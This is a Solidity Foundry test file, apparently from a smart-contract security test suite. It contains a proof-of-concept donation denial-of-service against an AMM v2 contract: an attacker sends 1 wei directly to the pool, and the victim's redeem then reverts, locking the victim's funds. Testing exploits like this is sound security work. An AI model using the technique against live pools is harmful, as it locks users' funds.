// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "versions/AMM_v2.sol" as V2;
import "versions/lib/IERC20.sol";

contract MockToken is IERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint256 public totalSupply = 1000000 * 1e18;
    constructor() { balanceOf[msg.sender] = totalSupply; }
    function transfer(address to, uint256 value) external returns (bool) {
        balanceOf[msg.sender] -= value; balanceOf[to] += value; return true;
    }
    function approve(address spender, uint256 value) external returns (bool) {
        allowance[msg.sender][spender] = value; return true;
    }
    function transferFrom(address from, address to, uint256 value) external returns (bool) {
        allowance[from][msg.sender] -= value; balanceOf[from] -= value; balanceOf[to] += value; return true;
    }
}

contract DonationDosV2Test is Test {
    V2.AMM ammV2;
    MockToken token0;
    MockToken token1;
    address attacker = address(0x1337);
    address victim = address(0x1234);

    function setUp() public {
        token0 = new MockToken();
        token1 = new MockToken();
        ammV2 = new V2.AMM(IERC20(address(token0)), IERC20(address(token1)));

        token0.transfer(attacker, 10000);
        token1.transfer(attacker, 10000);
        token0.transfer(victim, 10000);
        token1.transfer(victim, 10000);

        vm.startPrank(attacker);
        token0.approve(address(ammV2), type(uint256).max);
        token1.approve(address(ammV2), type(uint256).max);
        vm.stopPrank();

        vm.startPrank(victim);
        token0.approve(address(ammV2), type(uint256).max);
        token1.approve(address(ammV2), type(uint256).max);
        vm.stopPrank();
    }

    // donation-dos:
    // If the token balances of the contract exceed its reserves, a `redeem` transaction by a sender possessing a positive amount of liquidity tokens never reverts.

    // PoC:
    // - Step 1 (setup): The victim deposits tokens to initialize the pool. The attacker then transfers 1 wei directly to the contract (donation), causing the real balance to decouple from the internal reserves.
    // - Step 2 (attack): The victim attempts to redeem their liquidity tokens. The transaction reverts due to strict equality checks, locking the funds (DoS).
    function test_donation_dos_attack_v2() public {
        vm.startPrank(victim);
        ammV2.deposit(10000, 10000);
        vm.stopPrank();

        assertEq(ammV2.r0(), 10000);
        assertEq(ammV2.r1(), 10000);

        vm.startPrank(attacker);
        token0.transfer(address(ammV2), 1);
        vm.stopPrank();

        assertEq(token0.balanceOf(address(ammV2)), 10001);
        assertEq(ammV2.r0(), 10000);

        vm.startPrank(victim);

        vm.expectRevert();
        ammV2.redeem(10000);

        vm.stopPrank();
    }
}
